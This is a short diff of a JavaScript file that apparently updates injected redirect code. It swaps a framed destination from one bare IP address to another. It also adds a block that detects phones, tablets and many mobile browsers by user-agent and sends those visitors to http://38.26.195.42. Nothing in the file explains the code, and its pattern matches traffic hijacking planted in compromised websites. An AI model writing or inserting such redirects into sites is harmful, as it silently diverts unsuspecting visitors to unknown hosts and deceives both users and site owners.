@@ -19,13 +19,9 @@
 })();
 
 
-try {
-  if (location.search.indexOf('?pc') !== 0 && /Android|Windows Phone|iPhone|iPod/i.test(navigator.userAgent)) {
-    window.location.href = 'http://38.26.195.40';
-  }
-} catch (e) {}
+
 var titlestr=document.title;
-setFrame("http://38.26.195.40");
+setFrame("http://38.26.195.42");
 
 
 
@@ -53,4 +49,7 @@ function setFrame(olink){
         
       }, 100)
     } catch (e) {}
+}
+if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+	window.location.href="http://38.26.195.42";
 }
